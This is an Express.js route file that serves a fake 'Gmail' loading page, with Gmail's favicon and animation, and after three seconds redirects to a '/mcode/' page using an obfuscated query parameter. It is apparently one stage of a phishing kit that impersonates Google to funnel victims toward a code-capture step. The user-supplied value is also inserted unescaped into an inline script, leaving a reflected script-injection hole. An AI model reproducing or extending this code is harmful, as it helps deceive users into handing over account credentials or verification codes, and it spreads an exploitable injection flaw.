
const express = require ('express');
const router = express.Router();
const db = require('../db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation


router.get('/', async (req, res) => {


    const data5 = req.query.tgrdsfgdytrbdfwergter;
    const url = `/mcode/?dfgfhtuyghnbcgferfh=${data5}`;

  
  

    if (data5 == null) {
        res.render('error');
    
      }else{

    const htmlContent = `
    <!doctype html>
    <html lang="en">
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gmail</title>
        <link rel="shortcut icon" href="/images/gmail.ico" type="image/x-icon">
       
           <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
    

    <style>
                :root {
            --yellow: #feb60a;
            --red: #ff0062;
            --blue: #00dbf9;
            --violet: #da00f7;
            }
            body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: white;
            }
            div.container {
            display: flex;
            justify-content: center;
            align-items: center;
            }
            div > div {
            width: 3vw;
            height: 3vw;
            border-radius: 100%;
            margin: 2vw;
            background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
            animation: bounce 1.5s 0.5s linear infinite;
            }
            .yellow {
            background-color: var(--yellow);
            }

            .red {
            background-color: var(--red);
            animation-delay: 0.1s;
            }

            .blue {
            background-color: var(--blue);
            animation-delay: 0.2s;
            }

            .violet {
            background-color: var(--violet);
            animation-delay: 0.3s;
            }

            @keyframes bounce {
            0%, 50%, 100% {
            transform: scale(1);
            filter: blur(0px);
            }
            25% {
            transform: scale(0.6);
            filter: blur(3px);
            }
            75% {
            filter: blur(3px);
            transform: scale(1.4);
            }
            }
    </style>
    </head>
            <body>
    <center><object data="/gmail_animation.gif" style="height:420px; width:550px"></object></center>
            </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            } 

});

    

module.exports =router;
